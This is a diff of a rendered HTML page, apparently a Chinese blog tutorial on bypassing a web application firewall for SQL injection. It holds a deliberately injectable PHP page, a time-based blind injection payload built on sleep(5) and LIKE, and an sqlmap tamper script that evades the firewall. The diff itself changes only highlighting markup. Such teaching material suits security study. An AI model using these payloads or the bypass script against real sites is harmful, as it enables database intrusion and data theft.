@@ -94,28 +94,28 @@
 <li>Mysql：5.5.53</li>
 </ul>
 <p>PHP SQL注入页面代码：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-
-$link <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_connect</span>(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>,<span style="color:#e6db74">&#39;root&#39;</span>,<span style="color:#e6db74">&#39;root&#39;</span>)<span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Mysql Cannot Connect&#39;</span>);
-
-<span style="color:#a6e22e">mysql_select_db</span>(<span style="color:#e6db74">&#39;qq&#39;</span>);
-$id <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#e6db74">&#39;id&#39;</span>])<span style="color:#f92672">?</span>$_REQUEST[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>;
-
-$sql<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;select * from qq where id = &#34;</span><span style="color:#f92672">.</span>$id;
-<span style="color:#66d9ef">echo</span> $sql<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;hr&gt;&#39;</span>;
-<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_query</span>($sql)){
-    
-     <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">mysql_error</span>($link));
-}
-$data <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_fetch_assoc</span>($result);
-     
-<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;ID   = &#39;</span><span style="color:#f92672">.</span>$data[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;br&gt;&#39;</span>;
-<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;NAME = &#39;</span><span style="color:#f92672">.</span>$data[<span style="color:#e6db74">&#39;name&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;br&gt;&#39;</span>;
-     
-<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;AGE  = &#39;</span><span style="color:#f92672">.</span>$data[<span style="color:#e6db74">&#39;age&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;br&gt;&#39;</span>;
-
-<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>从上方代码可以看到ID并没有做过滤</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$link <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_connect</span>(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>,<span style="color:#e6db74">&#39;root&#39;</span>,<span style="color:#e6db74">&#39;root&#39;</span>)<span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Mysql Cannot Connect&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mysql_select_db</span>(<span style="color:#e6db74">&#39;qq&#39;</span>);
+</span></span><span style="display:flex;"><span>$id <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#e6db74">&#39;id&#39;</span>])<span style="color:#f92672">?</span>$_REQUEST[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$sql<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;select * from qq where id = &#34;</span><span style="color:#f92672">.</span>$id;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $sql<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;hr&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_query</span>($sql)){
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">mysql_error</span>($link));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$data <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_fetch_assoc</span>($result);
+</span></span><span style="display:flex;"><span>     
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;ID   = &#39;</span><span style="color:#f92672">.</span>$data[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;br&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;NAME = &#39;</span><span style="color:#f92672">.</span>$data[<span style="color:#e6db74">&#39;name&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;br&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>     
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;AGE  = &#39;</span><span style="color:#f92672">.</span>$data[<span style="color:#e6db74">&#39;age&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;br&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>从上方代码可以看到ID并没有做过滤</p>
 <p>那我们现在测试一下注入点是否可以注入到数据</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/d9ee0afa-4f5e-11ec-8b7b-00d861bf4abb.jpg" alt="enter description here"></p>
 <p>现在我们开启某锁漏洞防护功能</p>
@@ -173,7 +173,7 @@ $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_fet
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/db5c8de4-4f5e-11ec-8cee-00d861bf4abb.jpg" alt="enter description here"></p>
 <p>现在我们构造语句：</p>
 <pre tabindex="0"><code>
-And '1' like IF(ascii(substr(user(),1,1)) LiKe 113,1,sleep(5))
+And &#39;1&#39; like IF(ascii(substr(user(),1,1)) LiKe 113,1,sleep(5))
 </code></pre><p>这段语句简单解释下，大牛直接跳过。</p>
 <p>Substr()截取user()用户名第一位 为r</p>
 <p>Ascii(‘r’) 将r 转换成ascii码</p>
@@ -183,8 +183,7 @@ And '1' like IF(ascii(substr(user(),1,1)) LiKe 113,1,sleep(5))
 <p>最后答案 114不等于113</p>
 <p>剩下盲注出你想要的数据就要慢慢去测试了</p>
 <p>最终Payload:</p>
-<pre tabindex="0"><code>and '1' like if(ascii(substr(user(),1,1)) like 113,1,sleep(5))
-
+<pre tabindex="0"><code>and &#39;1&#39; like if(ascii(substr(user(),1,1)) like 113,1,sleep(5))
 </code></pre><p>能遇到某锁不拦截这些函数感觉也挺奇怪的</p>
 <p>下面讲一下如果拦截我们应该使用什么方法绕过呢</p>
 <p>这里只提供知识点没有实战</p>
@@ -193,20 +192,20 @@ And '1' like IF(ascii(substr(user(),1,1)) LiKe 113,1,sleep(5))
 <p>先直接使用SQLmap进行测试（毋庸置疑，肯定失败）：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/dbf66720-4f5e-11ec-bdc6-00d861bf4abb.jpg" alt="enter description here"></p>
 <p>在经过大量测试以后，我们定位特征，写出了bypass脚本：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
-<span style="color:#f92672">import</span> re
-<span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY
-__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>LOW
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload):
-    <span style="color:#66d9ef">if</span> payload:
-              <span style="color:#66d9ef">pass</span>
-              payload <span style="color:#f92672">=</span>
-payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;SLEEP(5)&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">0</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> LikE Sleep(5)&#34;</span>)
-       payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;/*FFFFFFFFFFFFFFFFFFFFFFFFF*/&#34;</span>)
-              p <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;(\d+)=&#39;</span>)
-              payload<span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>sub(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;&#39;\1&#39;LikE &#34;</span>, payload)
-<span style="color:#66d9ef">return</span> payload
-</code></pre></div><p>测试结果：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY
+</span></span><span style="display:flex;"><span>__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>LOW
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> payload:
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>              payload <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;SLEEP(5)&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">0</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> LikE Sleep(5)&#34;</span>)
+</span></span><span style="display:flex;"><span>       payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;/*FFFFFFFFFFFFFFFFFFFFFFFFF*/&#34;</span>)
+</span></span><span style="display:flex;"><span>              p <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;(\d+)=&#39;</span>)
+</span></span><span style="display:flex;"><span>              payload<span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>sub(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;&#39;\1&#39;LikE &#34;</span>, payload)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> payload
+</span></span></code></pre></div><p>测试结果：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/dc39a562-4f5e-11ec-bb41-00d861bf4abb.jpg" alt="enter description here"></p>
 <h2 id="0x04-小总结">0x04 小总结</h2>
 <p>等价替换</p>
